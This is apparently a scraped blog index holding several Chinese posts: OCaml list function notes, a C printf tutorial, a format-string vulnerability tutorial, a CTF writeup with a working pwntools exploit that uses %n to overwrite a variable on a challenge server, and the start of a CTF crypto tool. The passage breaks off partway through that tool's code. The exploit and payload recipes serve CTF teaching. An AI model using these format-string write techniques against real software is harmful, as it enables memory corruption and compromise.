lst：是要处理的列表。 从列表的左边开始，依次用 f 更新累积值。 例子： 用于实现之前的列表映射函数map： 12let map f lst = List.rev (List.fold_left (fun x acc -&gt; (f x) :: acc) lst []);; List.rev定义： 1List.rev : &#x27;a list -&gt; &#x27;a list 返回一个反转后的列表。 示例： 12List.rev [1; 2; 3];;(* 结果: [3; 2; 1] *) List.map定义： 1List.map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a list -&gt; &#x27;b list 对列表中每个元素应用函数，按原顺序生成等长的新列表。 示例： 12345List.map (fun x -&gt; x * x) [1; 2; 3];;(* 结果: [1; 4; 9] *)List.map String.length [&quot;ab&quot;; &quot;c&quot;; &quot;def&quot;];;(* 结果: [2; 1; 3] *) List.flatten/List.concat定义： 1List.flatten : &#x27;a list list -&gt; &#x27;a list 把列表的列表 （List of lists）按顺序拼接为一个列表。 示例： 12345List.flatten [[1; 2]; []; [3]; [4; 5]];;(* 结果: [1; 2; 3; 4; 5] *)List.flatten [[&quot;ab&quot;; &quot;cd&quot;]; [&quot;ef&quot;]];;(* 结果: [&quot;ab&quot;; &quot;cd&quot;; &quot;ef&quot;] *) List.concat_map定义： 1List.concat_map : (&#x27;a -&gt; &#x27;b list) -&gt; &#x27;a list -&gt; &#x27;b list “先映射、再拍平”的组合。 List.concat_map f xs 等价于 List.flatten (List.map f xs)。 示例： 12345List.concat_map (fun x -&gt; [x; x * x]) [1; 2; 3];;(* 结果: [1; 1; 2; 4; 3; 9] *)List.concat_map (fun s -&gt; List.of_seq (String.to_seq s)) [&quot;ab&quot;; &quot;cd&quot;];;(* 结果: [&#x27;a&#x27;; &#x27;b&#x27;; &#x27;c&#x27;; &#x27;d&#x27;] *) List.filter语法： 1List.filter (fun x -&gt; condition) list List.filter：用于从列表中挑选符合条件的元素。 参数： fun x -&gt; condition：一个函数，对列表中的每个元素 x 判断是否满足条件（condition 是布尔表达式）。 list：要过滤的列表。 返回值：一个新列表，包含原列表中所有满足条件的元素。 List.cons定义： 1List.cons : &#x27;a -&gt; &#x27;a list -&gt; &#x27;a list 也就是 :: 运算符的函数形式：把一个元素放到一个列表的前面（即“构造”一个新列表）。 示例： 12List.cons 1 [2;3];;(* 结果: [1;2;3] *) 相当于： 11 :: [2;3] List.take定义： 1List.take : int -&gt; &#x27;a list -&gt; &#x27;a list （来源： https://ocaml.org/manual/5.3/api/List.html 。5.3版本里也有。） 取出列表前 n 个元素，如果列表长度小于 n，就返回整个列表。 示例： 12List.take [10;20;30;40] 2;;(* 结果: [10;20] *) List.nth定义： 1List.nth : &#x27;a list -&gt; int -&gt; &#x27;a 从列表中取出第 n 个元素（0-based），如果越界则抛异常。 示例： 12List.nth [&quot;a&quot;;&quot;b&quot;;&quot;c&quot;] 1;;(* 结果: &quot;b&quot; *)","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/en/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Ocaml","slug":"Ocaml","permalink":"https://archer-baiyi.github.io/en/tags/Ocaml/"}]},{"title":"攻防世界 CGfsb Writeup","slug":"CTF/Pwn/攻防世界-CGfsb-Writeup","date":"2025-05-19T14:32:48.000Z","updated":"2025-06-10T19:06:45.477Z","comments":true,"path":"2025/05/19/CTF/Pwn/攻防世界-CGfsb-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/05/19/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb-Writeup/","excerpt":"利用格式化字符串漏洞修改目标变量的值。","text":"题目 观察使用IDA打开文件： 注意到格式化字符串（Format String）漏洞的常见漏洞： 12fgets(s, 100, stdin);printf(s); 并注意到main函数里的逻辑，只要pwnme的值等于8我们即可得到flag。 找到pwnme的地址： 10804A068 Exploit首先发送这个Payload 123456789101112131415161718from pwn import *host = &quot;61.147.171.105&quot;port = 59350r = remote(host, port)test_payload = b&quot;AAAA&quot; + 15*b&quot;,%x&quot; # 由于没有给后续的参数，所以程序会自动从Stack上按顺序读取15个值。r.recvuntil(&quot;your name:&quot;)r.sendline(&quot;A&quot;)r.recvuntil(&quot;leave your message please:&quot;)r.sendline(test_payload)# r.sendline(payload)r.interactive() 会看到以下内容： 1234hello Ayour message is:AAAA,ff91236e,f7f4a5a0,f0b5ff,ff91239e,1,c2,a4198fb,0,0,41414141,2c78252c,252c7825,78252c78,2c78252c,252c7825Thank you! 可以发现第10个值41414141正是AAAA对应的ASCII码，这意味着我们的格式化字符串在栈中的偏移是第 10 个位置。（因为我们的输入是由fgets写入进s的，所以会和printf读取的位置有偏差。） 确定参数位置了之后我们便可以通过这个Payload修改pwnme的值了： 123pwnme_addr = 0x0804A068payload = p32(pwnme_addr) + b&#x27;aaaa%10$n&#x27; 首先填需要修改的数据的地址（因为是32-bit的程序，所以地址是32位，也就是4个Byte），由于我们希望将pwnme的值修改为8，所以我们还需要加4 Byte的padding，也就是4个”a”。 而%10$n 的意思是从 第10个参数位置 取出一个地址，然后把已经打印出来的字符总数（4+4=8）写入那个地址。 完整代码： 12345678910111213141516171819202122232425262728from pwn import *host = &quot;61.147.171.105&quot;port = 59350pwnme_addr = 0x0804A068r = remote(host, port)# test_payload = b&quot;AAAA&quot; + 15*b&quot;,%x&quot;payload = p32(pwnme_addr) + b&#x27;aaaa%10$n&#x27;r.recvuntil(&quot;your name:&quot;)r.sendline(&quot;A&quot;)r.recvuntil(&quot;leave your message please:&quot;)# r.sendline(test_payload)r.sendline(payload)r.interactive() # hello A# your message is:# haaaa# you pwned me, here is your flag:# cyberpeace&#123;0a7cd9ddadcf7730d41928c9c3877ee8&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"格式化字符串（Format String）漏洞介绍","slug":"CTF/Pwn/格式化字符串（Format-String）漏洞介绍","date":"2025-05-19T08:08:10.000Z","updated":"2025-12-02T12:40:03.885Z","comments":true,"path":"2025/05/19/CTF/Pwn/格式化字符串（Format-String）漏洞介绍/","permalink":"https://archer-baiyi.github.io/en/2025/05/19/CTF/Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88Format-String%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"我们首先来看一下什么是格式化字符串函数。 格式化字符串函数格式化字符串（ format string）函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。 可以参考这个定义： The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments. （来源：https://ocaml.org/manual/5.0/api/Printf.html） 一般来说，格式化字符串在利用的时候主要分为三个部分 格式化字符串函数 格式化字符串 变量，可选 例子： 1234567# include &lt;stdio.h&gt;int main(void)&#123; int i = 10; printf(&quot;%d\\n&quot;, i); // %d是输出控制符，d 表示十进制，后面的 i 是输出参数* return 0;&#125; 格式化字符串函数分为输入和输出，其中 - 输入： 函数 说明 scanf() 从标准输入读取数据 基本语法： 1scanf(&quot;格式字符串&quot;, &amp;变量1, &amp;变量2, ...); 例子： 123456789101112# include &lt;stdio.h&gt;int main(void)&#123; int age; float height; char name[20]; scanf(&quot;%d %f %s&quot;, &amp;age, &amp;height, name); return 0;&#125; 注意：scanf(&quot;%s&quot;, name); 不需要加 &amp;，因为数组名本身就是地址。 - 输出： 函数名 说明 printf 向标准输出（通常是终端）打印格式化字符串 fprintf 向指定文件流打印格式化字符串（如 stderr, 文件指针等） sprintf 将格式化的字符串写入字符数组（注意缓冲区溢出风险） snprintf 将格式化的字符串写入字符数组，指定最大写入长度，更安全 asprintf 将格式化字符串写入动态分配的内存（GNU 扩展，非标准 C） dprintf 向指定的文件描述符写入格式化字符串（POSIX，常用于系统编程） vprintf 类似 printf，但参数通过 va_list 传递（用于变参函数） vfprintf 类似 fprintf，参数为 va_list vsprintf 类似 sprintf，参数为 va_list（不安全） vsnprintf 类似 snprintf，参数为 va_list（推荐用于变参安全格式化） 格式化字符串正如上面的定义里说的，格式化字符串里除了明文还有格式化占位符。我们这里来重点关注一下这个格式化占位符。 格式化占位符（conversion specifications）的语法如下： 1%[parameter][flags][field width][.precision][length]type - Parameter：指定用于格式化的参数位置（从1开始） 字符 说明 n$ 其中n是参数位置 例子： 12printf(&quot;%2$d %1$d&quot;, 11, 22);// 会输出 22 11 - Flags： 标志 说明 - 左对齐（默认是右对齐） + 总是显示正号或负号（例如 +10） (空格) 正数前加空格，负数前加负号 0 用0填充未占满的宽度 # 对于%o、%x、%X等，添加前缀（如0x）；对于%f等，始终包含小数点 - Field Width：指定最小输出字符数，不足时用空格（或0）填充，如果要使用变量指定宽度，可以用 *。 例子： 12345printf(&quot;%d&quot;, 42);// 会输出 &quot; 42&quot; （前面有3个空格）printf(&quot;%*d&quot;, 5, 42);// 会输出 &quot; 42&quot; （前面有3个空格） - Precision：指定数字小数点后的位数或字符串的最大输出长度： 对于浮点数（如 %f）：表示小数点后保留的位数，如 %.2f 对于字符串（如 %s）：表示最大输出字符数，如 %.5s 可以使用 * 表示由参数动态提供 - Length：指出浮点型参数或整型参数的长度 修饰符 说明 hh signed char 或 unsigned char h short 或 unsigned short l long 或 unsigned long ll long long 或 unsigned long long L long double（用于%Lf） z size_t t ptrdiff_t j intmax_t 或 uintmax_t 例子： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;int main() &#123; signed char a = -5; printf(&quot;%hhd\\n&quot;, a); // 会输出 &quot;-5&quot; short s = 32000; printf(&quot;%hd\\n&quot;, s); // 会输出 &quot;32000&quot; long l = 123456789L; printf(&quot;%ld\\n&quot;, l); // 会输出 &quot;123456789&quot; long long ll = 9223372036854775807LL; printf(&quot;%lld\\n&quot;, ll); // 会输出 &quot;9223372036854775807&quot; long double ld = 3.141592653589793238L; printf(&quot;%Lf\\n&quot;, ld); // 会输出 &quot;3.141593&quot;（默认保留6位小数） size_t sz = 100; printf(&quot;%zu\\n&quot;, sz); // 会输出 &quot;100&quot; ptrdiff_t diff = -8; printf(&quot;%td\\n&quot;, diff); // 会输出 &quot;-8&quot; intmax_t im = 9223372036854775807; printf(&quot;%jd\\n&quot;, im); // 会输出 &quot;9223372036854775807&quot; return 0;&#125; - Type：也称转换说明（conversion specification/specifier），指定具体的数据类型，有以下选择 字符 说明 %p 打印指针（十六进制地址） %x 打印十六进制（小写） %s 打印字符串（char*），即打印某个地址里的内容。 %.2f 打印浮点数，保留小数点后2位 %f 打印浮点数（float/double） %c 打印单个字符（char） %d 打印十进制整数（int） %% 输出一个百分号 % 其中只有Type是必须要给的，其他均可以省略。 例子： 1234567891011121314151617181920#include &lt;stdio.h&gt;int main() &#123; int i = 123; float pi = 3.14159; char letter = &#x27;A&#x27;; char name[] = &quot;hello&quot;; int hex = 255; printf(&quot;整数：%d\\n&quot;, i); printf(&quot;浮点数（默认）：%f\\n&quot;, pi); printf(&quot;浮点数（保留两位）：%.2f\\n&quot;, pi); printf(&quot;字符串：%s\\n&quot;, name); printf(&quot;字符：%c\\n&quot;, letter); printf(&quot;十六进制：%x\\n&quot;, hex); printf(&quot;百分号：%%\\n&quot;); return 0;&#125; 注意：在第二部分一定要给定变量，如果没有给，则会从错误的内存地址读取数据，导致不可预期的行为。 此外还有一个比较特殊的格式符：%n 。这个格式符会让 printf 把当前已经打印的字符数量写入n。（或者说写入给定的地址。） 比如说下面这个例子（正常用法） 12345678#include &lt;stdio.h&gt;int main() &#123; int n; printf(&quot;hello%n&quot;, &amp;n); return 0;&#125; n的值会被存储为5。 由于它的特殊性以及危险性，很多现代系统在libc中禁用了 %n，或者在格式化函数上增加了保护（如glibc中对 %n 的格式检查）。 不过正是因为它的危险性所以我们在pwn里经常会用它来修改内存数据 变量希望输出的变量。 格式化字符串漏洞正常情况：在进入printf函数之后，函数会首先获取第一个参数，一个一个读取其字符会遇到两种情况 当前字符不是%，直接输出到相应标准输出。 当前字符是%， 继续读取下一个字符 如果没有字符，报错 如果下一个字符是%, 输出% 否则根据相应的字符，获取相应的参数，对其进行解析并输出 例子： 12345678910#include &lt;stdio.h&gt;int main() &#123; int a = 10; float b = 3.14f; // 注意：传入变参会被“默认实参提升”为 double char *str = &quot;hello&quot;; printf(&quot;Int: %d, Float: %f, String: %s\\n&quot;, a, b, str); return 0;&#125; 参数是怎么传进 printf 的（32-bit 和 64-bit）32-bit（cdecl）——全部走栈 变参有“默认实参提升（default argument promotions）”：float 会提升为 double（占 8 字节），char/short 提升为 int。 典型调用时栈的示意（自上而下是低地址 → 高地址，或按“调用现场从下往上”理解也可以）： 1234567891011+------------------------------+| 返回地址（printf 结束后跳转） |+------------------------------+| 格式字符串地址 | --&gt; &quot;Int: %d, Float: %f, String: %s\\n&quot;+------------------------------+| 参数3（str，4B） | --&gt; 指向 &quot;hello&quot;+------------------------------+| 参数2（b，double，8B） | --&gt; 3.14（已提升）+------------------------------+| 参数1（a，4B） | --&gt; 10+------------------------------+ printf 在解析到 %d/%f/%s 时，会从“第一个可变参数槽位”开始，依次取“4B/8B/指针”的值并格式化输出。 x86-64（System V ABI）——寄存器优先 + 溢出到栈 前 6 个整数/指针类参数：RDI, RSI, RDX, RCX, R8, R9 前 8 个浮点类参数：XMM0–XMM7（float 仍提升为 double） 变参函数还会准备一个寄存器保存区（register save area）和栈溢出区（overflow area）。va_list/va_arg 会按参数类型从对应区域顺序取值；寄存器名额用完后改从栈上取。 对应上面的例子，调用瞬间常见分配为： RDI = &quot;Int: %d, Float: %f, String: %s\\n&quot;（格式串） RSI = a（%d） XMM0 = b 的 double（%f） RDX = str（%s） 在64-bit架构下不是所有参数都在栈上。printf 通过 va_list 维护“当前吃到第几个槽位”，按类型先从寄存器保存区拿，超出再从栈拿；这就是为什么64-bit 下偏移（offset）和 32-bit 不同，必须现场探测或用 %n$ 显式参数序号。 特殊情况以及偏差值当我们在使用格式化字符串函数但未提供后续实参（即只给了 fmt 一个参数）时： 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello %x %x %x %x&quot;); return 0;&#125; printf 在扫描到每个转换说明（%...）时，会依据 ABI 约定通过 va_arg 按顺序从可变参数起始位置检索下一参数槽位的内容：在 x86（32-bit） 上对应为栈槽，在 x86-64 SysV 上对应为寄存器保存区（reg_save_area）以及栈溢出区（overflow_arg_area）。 由于这些槽位未被显式赋值，读取到的将是相应存储区域中的现存（残存）/未定义数据，于是被按 %x/%p/%s 等格式解释并输出。进一步地，当该顺序读取过程推进到包含本次输入缓冲区（例如位于栈、堆或 .bss）的地址范围，且首次取到我们预置的标记（如 AAAA...）时，该标记对应的参数序号就称为偏差值 k（即从“第一个可变参数槽位”开始计数，到首次命中标记之间的槽位数量）。这样一来，我们即可使用显式参数序号（如 %k$p, %k$s, %k$n）稳定地指向目标槽位进行泄露或写入。 漏洞表现在CTF的题目里这个漏洞一般的表现如下： 12345678#include &lt;stdio.h&gt;int main() &#123; char buf[100]; fgets(buf, sizeof(buf), stdin); printf(buf); // 会将我们的输入直接当成格式字符串并处理 return 0;&#125; 我们可以利用这个漏洞读取栈上的内容（如变量值、返回地址等）或者通过 %n 格式符（就是我们之前提到的那个危险的格式符）向指定内存地址写入数据。 Exploit技巧读取栈上的内容12printf(&quot;%x %x %x&quot;);// bffff5c4 80484f0 1 12printf(&quot;%p %p %p&quot;);// 0xbffff5c4 0x80484f0 0x1 %x ：以十六进制整数形式输出栈上的内容。 %p ：以指针形式（十六进制地址）输出栈上的内容。 123payload = b&quot;%p &quot; * 40payload = b&quot;%x &quot; * 40 或者也可以使用%n$p： 1payload = &quot;%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p&quot; 1payload = &quot; &quot;.join([f&quot;%&#123;i&#125;$p&quot; for i in range(1, 61)]).encode() 读取任意地址的字符串 %s：把 栈上的值当成一个指针地址，并尝试打印这个地址指向的内存，直到遇到 \\0。 假设栈上某个参数的值是： 10x08049000 → 指向 &quot;HelloWorld&quot; 用 %x和%p会输出 1280490000x8049000 用%s则会输出 12printf(&quot;%s&quot;);HelloWorld 一般流程 确定偏移S（offset）： 输入形如 AAAA,%p,%p,%p... 看第几个 %p 能读出我们可控的标记（比如 0x41414141），得到偏移 S。 使用下面的方法构造payload 假如我们确定了偏移，并且知道了flag的具体地址，那么我们便可以用以下的payload直接读取flag的内容： 123def fmt_read_addr_payload(offset, addr, k=1): fmt = f&quot;%&#123;offset + k&#125;$s&quot;.encode() return fmt + b&quot;A&quot;*(8 * k - len(fmt)) + p64(addr) 其中： offset是我们确定的偏移 addr是我们希望读取的内容的地址 8*k主要用于对齐。（如果k=1不行，可以尝试k=4，貌似比较稳。） 因为p64(addr) 直接接在格式串后面，如果没有按8字节对齐，它大概率不会正好落在第offset个槽位上，也就会导致读取出问题。 写入一般流程 确定偏移 S（offset）： 输入形如 AAAA,%p,%p,%p... 看第几个 %p 能读出我们可控的标记（比如 0x41414141），得到偏移 S。 放置目标地址（避免\\x00截断）： 把“格式化指令（全 ASCII）”放在前面； 把目标地址（或一串地址）放在 payload 末尾； 用位置参数%K$... 来点名这些地址（K 从 S + ceil(len(fmt_ascii)/8) 起）。 对齐/padding： written = 到当前为止已输出字符数； 目标值 want（希望被写入到内存里的数值，按写入宽度取模）； 计算： 1234567base = 256 #（%hhn，1字节）base = 65536 #（%hn，2字节）base = 2**32 #（%n，4字节）base = 2**64 #（%ln/%lln，8字节）pad = (want - (written % base)) % base# 如果 pad == 0，为了稳妥可用 pad = base（等价“加 0”） base为取值范围，分别等于1，2，4，8字节的最大值。 然后输出 %padc（或其他等价方式）把 written 调到想要的值。 执行写入： %K$hhn 写 1 字节 %K$hn 写 2 字节 %K$n 写 4 字节（int*） %K$ln/%K$lln 写 8 字节（long*/long long*，在 x86_64 都是 8Byte） 对 %hn/%n/%ln 这类多字节写，最好按“从小到大”的目标值排序写入，避免 padding 需要“回绕”到很大的数。或者直接用逐字节写 %hhn。 写 1 字节（%hhn）示例 1：把 pwnme_addr 的最低 1 字节写成 0x90假设已经测得偏移 S = 10，并用 BASE = S + ceil(len(fmt_ascii)/8) 计算出第一个地址是第 K=BASE 个参数位。 123456# 目标：*(uint8_t*)pwnme_addr = 0x90# 只需让 written % 256 == 0x90 (=144)payload =b&quot;%144c&quot; # written += 144b&quot;%K$hhn&quot; # 把 (written%256)=0x90 写进第 K 个参数指向的地址+ p32(pwnme_addr); 若此时 written % 256 不是从 0 开始，照公式算：pad = (0x90 - (written%256)) % 256，用 %padc 形成 padding。 fmtstr_payloadPwntools里有现成的高效构造这种payload的函数： 1fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) （官方文档：https://docs.pwntools.com/en/dev/fmtstr.html ） 参数（摘译）： offset：第一个可控“参数槽”的位置（即你测出来的 %n$p 起点）。 writes：要写入的目标，字典 &#123;address: value, ...&#125;。（将value写进address里） numbwritten：调用 printf 前已经输出的字节数（影响对齐/填充计算）。 write_size：原子写入粒度，&#39;byte&#39;|&#39;short&#39;|&#39;int&#39;|&#39;long&#39; 等。 例题 攻防世界 CGfsb Writeup","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://archer-baiyi.github.io/en/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"Format String","slug":"Format-String","permalink":"https://archer-baiyi.github.io/en/tags/Format-String/"}]},{"title":"C语言入门","slug":"编程/C语言入门","date":"2025-05-18T20:28:18.000Z","updated":"2025-05-19T08:07:22.657Z","comments":true,"path":"2025/05/18/编程/C语言入门/","permalink":"https://archer-baiyi.github.io/en/2025/05/18/%E7%BC%96%E7%A8%8B/C%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"","text":"基础Hello World老规矩我们还是先来看一下在C语言里是怎么写 Hello World 的： 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello, World!\\n&quot;); return 0;&#125; 其中： #include &lt;stdio.h&gt;：引入标准输入输出库，printf 就在这里面定义。 include的部分一般被叫做头文件。 int main()：程序的主函数，是程序执行的起点。 printf(&quot;Hello, World!\\n&quot;);：向屏幕输出 Hello, World!，\\n 表示换行。 return 0;：表示程序正常结束。 printf()printf 是 C 标准库函数，用于格式化文本并将其输出到标准输出。 它的语法相比于其他的编程语言（比如说Python，C++之类的）会复杂很多。 printf的参数主要分成2部分：格式化字符串以及变量名。其中格式化字符串（ format string）可以参考以下定义（我个人觉得这个定义比较清楚）： The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments. （来源：https://ocaml.org/manual/5.0/api/Printf.html） 我们来分情况看一下printf的具体语法： 1. 只有字符串的情况： 123456# include &lt;stdio.h&gt;int main(void)&#123; printf(&quot;Hello World!\\n&quot;); // \\n表示换行 return 0;&#125; 这种情况下就非常简单，直接在引号里输入希望输出的内容即可。 2. 涉及变量的情况： 1234567# include &lt;stdio.h&gt;int main(void)&#123; int i = 10; printf(&quot;%d\\n&quot;, i); // %d是输出控制符，d 表示十进制，后面的 i 是输出参数* return 0;&#125; 我们需要在格式化字符串（ format string）里给定符合要求的格式化。 格式化占位符的语法如下： 1%[parameter][flags][field width][.precision][length]type - Parameter：指定用于格式化的参数位置（从1开始） 字符 说明 n$ 其中n是参数位置 例子： 12printf(&quot;%2$d %1$d&quot;, 11, 22);// 会输出 22 11 - Flags： 标志 说明 - 左对齐（默认是右对齐） + 总是显示正号或负号（例如 +10） (空格) 正数前加空格，负数前加负号 0 用0填充未占满的宽度 # 对于%o、%x、%X等，添加前缀（如0x）；对于%f等，始终包含小数点 - Field Width：指定最小输出字符数，不足时用空格（或0）填充，如果要使用变量指定宽度，可以用 *。 例子： 12345printf(&quot;%d&quot;, 42);// 会输出 &quot; 42&quot; （前面有3个空格）printf(&quot;%*d&quot;, 5, 42);// 会输出 &quot; 42&quot; （前面有3个空格） - Precision：指定数字小数点后的位数或字符串的最大输出长度： 对于浮点数（如 %f）：表示小数点后保留的位数，如 %.2f 对于字符串（如 %s）：表示最大输出字符数，如 %.5s 可以使用 * 表示由参数动态提供 - Length：指出浮点型参数或整型参数的长度 修饰符 说明 hh signed char 或 unsigned char h short 或 unsigned short l long 或 unsigned long ll long long 或 unsigned long long L long double（用于%Lf） z size_t t ptrdiff_t j intmax_t 或 uintmax_t 例子： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;int main() &#123; signed char a = -5; printf(&quot;%hhd\\n&quot;, a); // 会输出 &quot;-5&quot; short s = 32000; printf(&quot;%hd\\n&quot;, s); // 会输出 &quot;32000&quot; long l = 123456789L; printf(&quot;%ld\\n&quot;, l); // 会输出 &quot;123456789&quot; long long ll = 9223372036854775807LL; printf(&quot;%lld\\n&quot;, ll); // 会输出 &quot;9223372036854775807&quot; long double ld = 3.141592653589793238L; printf(&quot;%Lf\\n&quot;, ld); // 会输出 &quot;3.141593&quot;（默认保留6位小数） size_t sz = 100; printf(&quot;%zu\\n&quot;, sz); // 会输出 &quot;100&quot; ptrdiff_t diff = -8; printf(&quot;%td\\n&quot;, diff); // 会输出 &quot;-8&quot; intmax_t im = 9223372036854775807; printf(&quot;%jd\\n&quot;, im); // 会输出 &quot;9223372036854775807&quot; return 0;&#125; - Type：也称转换说明（conversion specification/specifier），指定具体的数据类型，有以下选择 字符 说明 %d 打印十进制整数（int） %f 打印浮点数（float/double） %.2f 打印浮点数，保留小数点后2位 %s 打印字符串（char*） %c 打印单个字符（char） %x 打印十六进制（小写） %% 输出一个百分号 % 其中只有Type是必须要给的，其他均可以省略。 例子： 1234567891011121314151617181920#include &lt;stdio.h&gt;int main() &#123; int i = 123; float pi = 3.14159; char letter = &#x27;A&#x27;; char name[] = &quot;hello&quot;; int hex = 255; printf(&quot;整数：%d\\n&quot;, i); printf(&quot;浮点数（默认）：%f\\n&quot;, pi); printf(&quot;浮点数（保留两位）：%.2f\\n&quot;, pi); printf(&quot;字符串：%s\\n&quot;, name); printf(&quot;字符：%c\\n&quot;, letter); printf(&quot;十六进制：%x\\n&quot;, hex); printf(&quot;百分号：%%\\n&quot;); return 0;&#125; 注意：在第二部分一定要给定变量，如果没有给，则会从错误的内存地址读取数据，导致不可预期的行为。 此外还有一个比较特殊的格式符：%n 。这个格式符会让 printf 把当前已经打印的字符数量写入 n 所在的地址。 比如说下面这个例子 12345678#include &lt;stdio.h&gt;int main() &#123; int n; printf(&quot;hello%n&quot;, &amp;n); return 0;&#125; n的值会被存储为5。 由于它的特殊性以及危险性，很多现代系统在 libc 中禁用了 %n，或者在格式化函数上增加了保护（如 glibc 中对 %n 的格式检查）。","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/en/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C","slug":"C","permalink":"https://archer-baiyi.github.io/en/tags/C/"}]},{"title":"CryptexLab CTF密码学工具","slug":"CTF/Crypto/CryptexLab-CTF密码学工具","date":"2025-05-18T15:24:15.000Z","updated":"2026-01-24T10:05:33.764Z","comments":true,"path":"2025/05/18/CTF/Crypto/CryptexLab-CTF密码学工具/","permalink":"https://archer-baiyi.github.io/en/2025/05/18/CTF/Crypto/CryptexLab-CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B7%A5%E5%85%B7/","excerpt":"","text":"功能目前有以下功能： 编码： 编码： 可选编码方式：Base64，Base32，Base58，Base91，Binary，Hex 解码 可以自动进行多轮的base 32，58，64，（91，可选），二进制以及hex解码 古典密码： 栅栏密码 根据给定的密钥（栏数）进行加解密 凯撒密码： 给定密文以及密钥进行解密 给定密文，进行遍历解密 给定密文以及关键词，根据关键词自动查找遍历解密的结果中是否有符合要求的。 维吉尼亚密码： 给定密文以及密钥进行解密（支持密文中含有空格以及特殊符号） 给定密文，根据词频分析尝试解密（由于是基于统计的方法，所以只有当密文足够长时准确率才会相对较高） RSA： PEM 生成PEM 给定p,q,e的值，自动计算并生成PEM私钥，公钥以及所有参数信息 解析PEM： 自动判断公钥/私钥并提取参数 解析完成后可以选择将参数传递到破解RSA板块。 破解RSA： 给定 （n）,d,p,q,c（或更多）参数自动解密（将密文 c 解密并转成text格式）； 给定 （n）,e,p,q，自动计算 d ； 给定 （n）,e,p,q,c ，自动计算 d ，并解密密文； 给定 n，即可进行Fermat-Factorization，Pollard’s p-1算法尝试质因数分解 n（均可手动设置算法循环上限）； 给定 n,e，即可进行 Wiener’s Attack （均可手动设置算法循环上限）； 哈希： SHA256： 计算SHA256 MD5： 计算MD5 效果 环境将下面内容保存成requirements.txt: 12345tkpycryptodomecryptographybase58base91 并在命令行输入 1pip install -r requirements.txt 即可。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835836837838839840841842843844845846847848849850851852853854855856857858859860861862863864865866867868869870871872873874875876877878879880import tkinter as tkfrom tkinter import scrolledtextimport mathimport reimport base64import base58import base91from cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.number import long_to_bytesfrom collections import Counter, defaultdictimport stringimport hashlib# ------------------ 攻击/辅助函数 ------------------def fermat_factor(n, max_iter=1000000): a = math.isqrt(n) if a * a &lt; n: a += 1 for _ in range(max_iter): b2 = a*a - n b = math.isqrt(b2) if b*b == b2: return a - b, a + b a += 1 return Nonedef pollard_p1(n, B=1000000): a = 2 for j in 